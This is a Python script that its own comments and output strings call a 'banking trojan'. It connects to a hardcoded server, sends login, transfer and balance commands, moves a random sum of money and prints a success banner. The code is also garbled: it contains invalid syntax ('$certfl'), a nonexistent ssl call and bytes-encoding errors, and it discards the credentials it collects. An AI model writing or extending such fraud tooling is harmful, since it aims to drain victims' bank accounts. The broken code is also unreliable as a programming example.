import socket
import ssl
import os
import sys
import time
import random

# ------------------- Core Functions ------------------- #


def connect_to_bank(ip, port):
    """Connects to the bank's server and establishes a secure connection."""
    try:
        if ip == '192.168.1.10':  # Example IP for testing
            sock = ssl.sslwrap(socket.socket(), certfl=$certfl) # Replace with real cert path
            sock.connect((ip, port))
        else:
            sock = socket.socket()
            sock.connect((ip, port))

        return sock
    except Exception as e:
        print(f"Error connecting to Bank Server: {e}")
        return None


def send_command(sock, command):
    """Sends a command to the bank server and receives the response."""
    try:
        # ----------------------- Command Encoding -----------------------
        if command == "login":
            data = b"user1\n"  # Replace with actual username
        elif command == "transfer":
            amount_str = f"{random.randint(10,250)}".encode() # Transfer random amount between 10 and 250
            data = f"{amount_str}\n{command}\nuser1\n".encode()  # Replace with actual username
        elif command == "balance":
            data = b"balance\n".encode()  # Request account balance
        else:
            return None
        
        sock.send(data)
        response = sock.recv(4096).decode("utf-8").strip() # Adjust buffer size if needed
        return response

    except Exception as e:
        print(f"Error sending command: {e}")
        return None


def receive_data(sock, expected_length):
    """Receives data from the bank server, handling potential errors."""
    try:
        response = b""
        while len(response) < expected_length:
            chunk = sock.recv(min(4096, expected_length - len(response)))  # Adjust buffer size if needed
            if not chunk: # Break if connection closes early
                break
            response += chunk

        return response.decode("utf-8", errors="ignore").strip()
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None


# ------------------- Core Functions (Continued) ------------------- #



def get_user_input():
    """Prompts the user for input and validates it."""

    try:
        username = input("Bank User Name: ")
        if not username:
            raise ValueError("Username cannot be empty.")

        password = input("Bank Password: ")
        if not password:
            raise ValueError("Password cannot be empty.")

        return username, password

    except ValueError as e:
        print(f"Input Error: {e}")
        return get_user_input() # Retry input


def check_internet():
    """Checks if the internet connection is up."""

    try:
        # Use ping to test internet connectivity
        ping_result = os.system("ping -c 1 google.com > nul") # Redirect output for silent success
        return ping_result == 0  # Ping succeeded (return True) or Failed (return False)
    except Exception as e:
        print(f"Error checking internet connection: {e}")
        return False


# ------------------- Main Function ------------------- #

def main():
    """Main function to run the banking trojan."""

    if not check_internet():
        print("Error: No internet connectivity. Banking Trojan Failed.")
        sys.exit(1)

    username, password = get_user_input()

    # ----------------------- Login Phase -----------------------
    login_response = None
    try:
        sock = connect_to_bank('192.168.1.10', 443) # Replace with real IP and Port
        if sock is None:
            return

        send_command(sock, "login")
        login_response = receive_data(sock, 512)  # Adjust buffer size if needed
    except Exception as e:
        print(f"Login Error: {e}")
        sys.exit(1)


    if not login_response or "success" not in login_response.lower():
        print("Error: Login failed.")
        return

    # ----------------------- Transfer Phase -----------------------
    transfer_amount = random.randint(10,250) # Transfer random amount between 10 and 250
    transfer_result = None
    try:
        sock = connect_to_bank('192.168.1.10', 443) # Replace with real IP and Port
        if sock is None:
            return

        send_command(sock, "transfer")
        transfer_result = receive_data(sock, 512)  # Adjust buffer size if needed
    except Exception as e:
        print(f"Transfer Error: {e}")
        return


    if not transfer_result or "success" not in transfer_result.lower():
        print("Error: Transfer failed.")
        return

    # ----------------------- Balance Check Phase -----------------------
    balance_response = None
    try:
        sock = connect_to_bank('192.168.1.10', 443) # Replace with real IP and Port
        if sock is None:
            return

        send_command(sock, "balance")
        balance_response = receive_data(sock, 512)  # Adjust buffer size if needed
    except Exception as e:
        print(f"Balance Error: {e}")
        return


    if not balance_response or "success" not in balance_response.lower():
        print("Error: Balance Check Failed.")
        return

    print(f"\n--- Banking Trojan Successful ---")
    print(f"User Name: {username}")
    print(f"Transfer Amount: {transfer_amount} EUR")
    print(f"Balance: {balance_response.split(' ')[-1]} EUR (Check Balance)")

if __name__ == "__main__":
    main()
